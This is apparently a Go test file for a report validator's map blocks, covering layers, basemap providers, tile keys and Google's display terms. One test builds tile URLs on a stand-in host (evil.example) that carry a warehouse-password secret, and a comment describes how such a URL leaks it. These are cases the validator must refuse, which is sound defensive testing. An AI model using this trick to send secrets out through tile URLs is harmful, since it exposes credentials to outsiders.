package definition

import (
	"errors"
	"strings"
	"testing"
)

// mapReport is one interactive output holding the map blocks given.
func mapReport(blocks ...Block) Report {
	return Report{
		Name: "parcel-map", Dataset: "drops",
		Outputs: []Output{{Name: "interactive", Renderer: Interactive, Layout: blocks}},
	}
}

// drops is a map block over points, the shape most of these edit.
func drops() Block {
	return Block{
		Kind: ChartBlock, Chart: MapChart, Title: "Drops",
		X: DimensionRef{Field: "drop"}, Y: MeasureRef{Field: "parcels", Aggregate: "sum"},
		Map: &MapSpec{Layers: []MapLayer{ScatterLayer}, Lat: "lat", Lon: "lon"},
	}
}

func TestAMapReportValidates(t *testing.T) {
	cases := map[string]func(*Block){
		"points":         func(*Block) {},
		"lines":          func(b *Block) { b.Map = &MapSpec{Layers: []MapLayer{LineLayer}, Geometry: "route"} },
		"hexagons":       func(b *Block) { b.Map.Layers = []MapLayer{HexbinLayer}; b.Map.HexKm = 5 },
		"clusters":       func(b *Block) { b.Map.Layers = []MapLayer{ClusterLayer} },
		"by carrier":     func(b *Block) { b.Series = DimensionRef{Field: "carrier"} },
		"openstreetmap":  func(b *Block) { b.Map.Basemap = &Basemap{Provider: OpenStreetMap} },
		"mapbox dark":    func(b *Block) { b.Map.Basemap = &Basemap{Provider: Mapbox, Style: "dark"} },
		"a studio style": func(b *Block) { b.Map.Basemap = &Basemap{Provider: Mapbox, Style: "acme/ckx1y2z3"} },
		"a billed key": func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: Mapbox, Key: "${secret:mapbox-acme}"}
		},
		"google in indonesian": func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: GoogleMaps, Style: "hybrid", Language: "id", Region: "ID"}
		},
		"a url with a tile key": func(b *Block) {
			b.Map.Basemap = &Basemap{
				URL:         "https://tiles.example.org/{z}/{x}/{y}{r}.png?key=${secret:tiles-example}",
				Attribution: "© Example",
			}
		},
	}
	for name, edit := range cases {
		t.Run(name, func(t *testing.T) {
			b := drops()
			edit(&b)
			if err := mapReport(b).Validate(); err != nil {
				t.Errorf("refused: %v", err)
			}
		})
	}
}

func TestAMapReportIsRefused(t *testing.T) {
	cases := []struct {
		name string
		edit func(*Block)
		says string
	}{
		{"a line layer with no geometry", func(b *Block) { b.Map.Layers = []MapLayer{LineLayer} },
			"names no geometry field"},
		{"hexagons over shaded regions", func(b *Block) {
			b.Map.Layers, b.Map.Geometry = []MapLayer{PolygonLayer, HexbinLayer}, "zone"
		}, "one legend cannot explain both"},
		{"a hexagon width with no hexagons", func(b *Block) { b.Map.HexKm = 5 }, "draws no hexbin"},
		{"a hexagon wider than a continent", func(b *Block) {
			b.Map.Layers, b.Map.HexKm = []MapLayer{HexbinLayer}, MaxHexKm+1
		}, "outside"},
		// Colour is one channel: the ramp already says how much.
		{"a category over a choropleth", func(b *Block) {
			b.Map.Layers, b.Map.Geometry = []MapLayer{PolygonLayer, ScatterLayer}, "zone"
			b.Series = DimensionRef{Field: "carrier"}
		}, "already spends colour"},
		{"a category over a heat field", func(b *Block) {
			b.Map.Layers = []MapLayer{HeatLayer}
			b.Series = DimensionRef{Field: "carrier"}
		}, "already spends colour"},
		{"averaged hexagons", func(b *Block) {
			b.Map.Layers, b.Y.Aggregate = []MapLayer{HexbinLayer}, "avg"
		}, "average"},

		{"a provider and a url", func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: OpenStreetMap, URL: "https://t.example/{z}/{x}/{y}.png"}
		}, "name one or the other"},
		{"a provider nobody built", func(b *Block) { b.Map.Basemap = &Basemap{Provider: "bing"} },
			"want one of"},
		{"a style the provider lacks", func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: GoogleMaps, Style: "dark"}
		}, `style "dark"`},
		{"a credit line for a provider", func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: Mapbox, Attribution: "© me"}
		}, "set by its terms"},
		{"a key pasted in", func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: Mapbox, Key: "pk.eyJ1Ijoi"}
		}, "reference"},
		{"a key for a provider that takes none", func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: OpenStreetMap, Key: "${secret:openstreetmap-key}"}
		}, "takes none"},
		{"a language for mapbox", func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: Mapbox, Language: "fr"}
		}, "only the google basemap"},
		{"a region that is not one", func(b *Block) {
			b.Map.Basemap = &Basemap{Provider: GoogleMaps, Region: "USA"}
		}, "two-letter"},
		{"a style on a url", func(b *Block) {
			b.Map.Basemap = &Basemap{URL: "https://t.example/{z}/{x}/{y}.png", Attribution: "©", Style: "dark"}
		}, "only a named provider"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			b := drops()
			c.edit(&b)
			err := mapReport(b).Validate()
			if !errors.Is(err, ErrInvalid) {
				t.Fatalf("stored without complaint, or for the wrong reason: %v", err)
			}
			if !strings.Contains(err.Error(), c.says) {
				t.Errorf("the error does not say what is wrong:\n  %v\nwant it to mention %q", err, c.says)
			}
		})
	}
}

// A tile key is in every tile request, so whatever secret a basemap names is
// sent to every reader's browser. Without a rule about which secrets those may
// be, an author with publish rights reads the warehouse password by writing it
// into a tile URL and opening the network tab.
func TestABasemapCannotNameASecretThatIsNotATileKey(t *testing.T) {
	for name, bm := range map[string]*Basemap{
		"as a provider key": {Provider: Mapbox, Key: "${secret:warehouse-password}"},
		"as another provider's key": {Provider: GoogleMaps,
			Key: "${secret:mapbox-token}"},
		"inside a url": {URL: "https://evil.example/{z}/{x}/{y}.png?k=${secret:warehouse-password}",
			Attribution: "©"},
		// Encoded for the URL it sits in, which is still the password.
		"inside a url, encoded": {URL: "https://evil.example/{z}/{x}/{y}.png?k=${secret:warehouse-password|url}",
			Attribution: "©"},
	} {
		t.Run(name, func(t *testing.T) {
			b := drops()
			b.Map.Basemap = bm
			err := mapReport(b).Validate()
			if err == nil || !strings.Contains(err.Error(), "reaches every reader's browser") {
				t.Fatalf("a secret that is not a tile key was accepted as one: %v", err)
			}
		})
	}
}

// Google's terms forbid its maps beside anybody else's on one screen, and an
// output is one screen.
func TestGoogleMapsIsNotDrawnBesideAnotherProvider(t *testing.T) {
	google, osm := drops(), drops()
	google.Map.Basemap = &Basemap{Provider: GoogleMaps}
	osm.Title, osm.Map = "Depots", &MapSpec{Layers: []MapLayer{ScatterLayer}, Lat: "lat", Lon: "lon",
		Basemap: &Basemap{Provider: OpenStreetMap}}

	err := mapReport(google, osm).Validate()
	if err == nil || !strings.Contains(err.Error(), "Google's terms") {
		t.Fatalf("a Google map beside an OpenStreetMap one was stored: %v", err)
	}

	bare := drops()
	bare.Title = "No basemap at all"
	if err := mapReport(google, bare).Validate(); err != nil {
		t.Errorf("a map with no basemap is not somebody else's map: %v", err)
	}

	// A block needs no title, and the check once keyed on it.
	untitled := drops()
	untitled.Title = ""
	untitled.Map.Basemap = &Basemap{Provider: GoogleMaps}
	if err := mapReport(untitled, osm).Validate(); err == nil {
		t.Error("an untitled Google map was stored beside an OpenStreetMap one")
	}
}

func TestAMapReadsTheColumnsItsLayersNeed(t *testing.T) {
	b := drops()
	b.Series = DimensionRef{Field: "carrier"}
	b.Map.Layers = []MapLayer{ClusterLayer, FlowLayer}
	b.Map.ToLat, b.Map.ToLon = "to_lat", "to_lon"

	got := b.MapColumns()
	want := []MapColumn{RegionCol, LatCol, LonCol, ToLatCol, ToLonCol, SeriesCol, ValueCol}
	if len(got) != len(want) {
		t.Fatalf("columns = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("columns = %v, want %v", got, want)
		}
	}

	lines := Block{Map: &MapSpec{Layers: []MapLayer{LineLayer}, Geometry: "route"}, X: DimensionRef{Field: "route"}}
	if cols := lines.MapColumns(); len(cols) != 3 || cols[1] != GeometryCol {
		t.Errorf("a line layer reads the geometry field: %v", cols)
	}
}

func TestAURLTemplateHasARetinaTwinOnlyWhenItSaysSo(t *testing.T) {
	one, two := Basemap{URL: "https://t.example/{z}/{x}/{y}{r}.png"}.Templates()
	if one != "https://t.example/{z}/{x}/{y}.png" || two != "https://t.example/{z}/{x}/{y}@2x.png" {
		t.Errorf("templates = %q, %q", one, two)
	}
	if _, two := (Basemap{URL: "https://t.example/{z}/{x}/{y}.png"}).Templates(); two != "" {
		t.Errorf("a template with no {r} was given a retina twin: %q", two)
	}
}
